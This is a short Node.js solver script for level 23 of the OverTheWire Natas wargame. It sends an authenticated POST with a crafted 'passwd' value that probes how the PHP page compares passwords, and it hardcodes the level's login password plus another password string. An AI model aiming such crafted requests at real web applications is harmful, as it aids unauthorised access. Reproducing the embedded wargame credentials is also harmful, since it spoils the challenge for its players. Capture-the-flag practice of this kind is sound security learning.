#!/usr/bin/env node
/* eslint-disable */
http = require('http');

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP';
credentials = {
    host: 'natas23.natas.labs.overthewire.org',
    login: 'natas23',
    password: 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'
}

let t = 0;
// let i = 640

// while (--i)
//     doReq(i)

function toHex(str) {
    str = '' + str
    var result = '';
    for (var i = 0; i < str.length; i++) {
        result += str.charCodeAt(i).toString(16);
    }
    return result;
}

function doReq(n, l) {
    const id = n
    console.log('start ', n);
    const postData = 'passwd=array(0=>1)';

    const options = {
        host: credentials.host,
        path: '/index.php?debug=true',
        method: 'POST',
        auth: `${credentials.login}:${credentials.password}`,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'COOKIE': 'PHPSESSID=0;'

        }
    };

    const req = http.request(options, (res) => {
        console.log(`STATUS:console. ${res.statusCode}`);
        console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
        // console.log(JSON.stringify(res.headers).match(/PHPSESSID=\w*;?/)[0]);
        res.setEncoding('utf8');
        let total = '';
        res.on('data', (chunk) => {
            total += chunk;
        });
        res.on('end', () => {
            console.log(total);
            console.log('end', ++t, id)
            process.exit()
        });
    });
    req.on('error', (e) => {
        console.error(`problem with request: ${e.message}`);
        process.exit();
    });

    // write data to request body
    req.write(postData);
    req.end();
}

doReq(1,true);